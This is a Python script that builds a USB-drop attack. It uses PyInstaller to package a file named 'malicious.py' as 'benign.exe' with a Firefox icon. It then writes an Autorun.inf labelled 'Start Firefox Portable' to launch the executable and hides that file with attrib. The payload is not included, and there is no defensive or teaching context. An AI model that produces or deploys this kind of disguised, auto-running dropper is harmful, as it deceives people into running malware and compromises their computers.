import PyInstaller.__main__
import shutil
import os


file_name = 'malicious.py'
exe_name = 'benign.exe'
icon = 'Firefox.ico'
pwd = os.getcwd()
usb_dir = os.path.join(pwd, 'USB')

if os.path.isfile(exe_name):
    os.remove(exe_name)

os.mkdir('USB')

print('Creating EXE')

# Create executable from Python script
PyInstaller.__main__.run([
    file_name,
    '--onefile',
    '--clean',
    '--log-level=ERROR',
    '--name='+exe_name,
    '--icon='+icon
])

print('EXE created')

# Clean up after PyInstaller
shutil.move(os.path.join(pwd, 'dist', exe_name), pwd)
shutil.rmtree('dist')
shutil.rmtree('build')
# shutil.rmtree('__pycache__')
os.remove(exe_name+'.spec')

print('Creating Autorun file')

# Create autorun file
with open('Autorun.inf', 'w') as file:
    file.write('(Autorun)\n')
    file.write('Open='+exe_name+'\n')
    file.write('Action=Start Firefox Portable\n')
    file.write('Label=My USB\n')
    file.write('Icon='+exe_name+'\n')

print('Setting up USB')

# Move files to 'USB' and set to hidden
shutil.move(exe_name, usb_dir)
shutil.move('Autorun.inf', usb_dir)
print('attrib +h '+os.path.join(usb_dir, 'Autorun.inf'))
os.system('attrib +h '+os.path.join(usb_dir, 'Autorun.inf'))
